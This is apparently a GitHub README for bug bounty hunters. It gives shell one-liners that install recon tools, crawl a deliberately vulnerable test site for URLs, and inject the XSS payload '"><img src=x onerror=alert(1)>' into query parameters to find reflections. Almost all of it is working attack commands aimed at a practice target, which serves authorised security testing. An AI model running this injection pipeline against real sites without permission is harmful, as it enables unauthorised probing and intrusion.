# XSS-OneLiner
Simple One Liner for finding XSS using automation

### Install tools
```bash
git clone https://github.com/rootbakar/bugbounty-toolkit
```
```bash
cd bugbounty-toolkit
```
```bash
chmod +x install_bounty_tools.sh
```
```bash
./install_bounty_tools.sh
```
```bash
go install -v github.com/Emoe/kxss@latest
```
```bash
go install github.com/rix4uni/xsschecker@latest
```

### Get All URLs
```bash
echo "testphp.vulnweb.com" | httpx -silent | katana -silent > katana.txt; echo "testphp.vulnweb.com" | httpx -silent | hakrawler -u > hakrawler.txt; echo "testphp.vulnweb.com" | waybackurls > waybackurls.txt; echo "testphp.vulnweb.com" | gau > gau.txt; cat katana.txt hakrawler.txt waybackurls.txt gau.txt | urldedupe -qs | httpx -silent | anew urls.txt
```

### XSS One Liner
**Command 1:**
```bash
cat urls.txt | qsreplace '"><img src=x onerror=alert(1)>' | kxss
```
![image](https://github.com/user-attachments/assets/7141d4af-a977-45dc-9cca-baafae48c606)

**Command 2:**
```bash
cat urls.txt | qsreplace '"><img src=x onerror=alert(1)>' | xsschecker -match '"><img src=x onerror=alert(1)>' -vuln
```
![image](https://github.com/user-attachments/assets/eec47e25-2ba6-4abf-be0f-727675830a53)


**Command 3:**
```bash
cat urls.txt  | qsreplace '"><img src=x onerror=alert(1)>' | freq | egrep -v 'Not'
```
![image](https://github.com/user-attachments/assets/017f6824-6b56-4d4c-a02d-f8aea95070c9)


